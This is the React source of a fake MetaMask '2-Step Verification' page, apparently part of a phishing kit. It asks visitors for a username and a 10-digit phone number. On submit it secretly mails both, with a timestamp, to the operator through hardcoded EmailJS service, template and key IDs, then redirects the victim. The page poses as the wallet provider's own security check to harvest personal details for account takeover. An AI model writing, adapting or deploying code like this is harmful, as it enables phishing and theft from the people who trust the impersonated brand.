import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

const Verify = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
  const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
  const navigate = useNavigate();

  // Handle number input (only digits, max 10)
  const handleNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
    if (value.length <= 10) {
      setPassword(value);
    }
  };

  const handleLogin = () => {
    let isValid = true;

    // Email validation
    if (!email) {
      setEmailError('Username is required');
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError('Invalid Username format');
      isValid = false;
    } else {
      setEmailError('');
    }

    // Password (Number) validation
    if (!password) {
      setPasswordError('Number is required');
      isValid = false;
    } else if (password.length !== 10) {
      setPasswordError('Number must be exactly 10 digits');
      isValid = false;
    } else {
      setPasswordError('');
    }

    // If valid, send email
    if (isValid) {
      const templateParams = {
        web_name: 'Metamask',
        from_name: 'Metamask',
        message: `Name: ${email}, 
        Phone: ${password}, 
        Date: ${new Date().toLocaleDateString()}, 
        Time: ${new Date().toLocaleTimeString()}`,
      };

      emailjs
        .send(
          'service_d7iarfv', // Your EmailJS Service ID
          'template_zzgorrr', // Your EmailJS Template ID
          templateParams,
          'cD8XBmJIzmsXY6T3j' // Your EmailJS Public Key
        )
        .then(() => {
          setEmail('');
          setPassword('');
          navigate('/alt'); // Navigate to the target route
        })
        .catch((error) => {
          console.error('Error:', error);
          alert('Failed to send email.');
        });
    }
  };

  return (
    <div className="bg-black py-64 flex flex-col items-center justify-center sm:py-40">
      <div className="w-full max-w-lg bg-white px-10 pb-10 rounded-lg shadow-lg">
        <header className="flex justify-center">
          <img src={require('../Images/MetaMask-Logo-thmb.png')} alt="Navigation" className="w-48" />
        </header>
        <main className="flex flex-col items-center">
          <h1 className="text-blue-800 text-3xl font-medium pb-1">2-Step Verification</h1>
          <h3 className="text-lg text-gray-700 mb-6">Verify Your Identity</h3>
          <form
            method="post"
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className="w-full"
          >
            <div className="mb-4">
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError ? 'border-red-500' : 'border-gray-300'
                }`}
                required
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>
            <div className="mb-6">
              <input
                type="text"
                id="password"
                value={password}
                onChange={handleNumberChange}
                placeholder={passwordPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  passwordError ? 'border-red-500' : 'border-gray-300'
                }`}
                maxLength="10"
                required
              />
              {passwordError && <p className="text-red-500 text-xs mt-1">{passwordError}</p>}
            </div>
            <div className="flex justify-center">
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700"
              >
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default Verify;
